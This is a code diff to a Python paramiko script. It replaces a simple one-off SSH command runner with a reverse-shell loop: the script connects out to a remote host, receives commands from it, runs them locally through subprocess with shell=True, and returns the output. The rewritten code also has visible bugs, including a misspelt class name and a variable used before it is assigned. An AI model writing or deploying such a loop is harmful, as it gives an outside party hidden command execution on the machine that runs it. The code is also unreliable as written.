@@ -1,21 +1,25 @@
 import paramiko
+import shlex
+import subprocess
 
 def command(ip, port, user, passwd, cmd):
-    client = paramiko.SSHClient()
-    #paramiko soporta auth por llaves, ademas de password
-    # esta funcion setea la politica al conectarse a serv
-    #sin host key conocido
-    #AutoAddPolicy automaticamnte agrega el hostname y nueva key
-    #al objeto SSHCLient
+    client = paramiko.SSHCLient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     client.connect(ip, username=user, password=passwd)
     ssh_session = client.get_transport().open_session()
-    _, stdout, stderr = client.exec_command(cmd)
-    output = stdout.readlines() + stderr.readlines()
-    if output:
-        print("-----OUTPUT-----")
-        for line in output:
-            print(line.strip())
+
+    if ssh_session.active:
+        ssh_session.send(command)
+        print(ssh_session.recv(1024))
+        while True:
+            command = ssh_session.recv(1024)
+            try:
+                cmd_output = subprocess.check_output(command, shell=True)
+                ssh_session.send(cmd_output)
+            except Exception as e:
+                ssh_session.send(str(e))
+    client.close()
+    return
 
 def main():
     import getpass
